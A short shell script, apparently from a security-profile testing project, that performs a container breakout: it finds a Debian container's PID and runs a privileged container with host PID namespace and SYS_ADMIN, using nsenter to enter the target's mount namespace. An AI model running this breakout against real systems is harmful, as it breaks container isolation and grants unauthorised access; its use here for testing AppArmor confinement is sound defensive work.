#!/bin/sh

attack="home/ubuntu/SecureWilly/Attacks/Nsenter/Breakout_to_Other_Container/sh_container"
docker ps | grep debian > dockerps
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
rm PID

#Attack container
docker run --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_ADMIN --rm -it debian:latest nsenter --target ${container_pid} --mount sh

sudo rm dockerps
sudo rm containerid
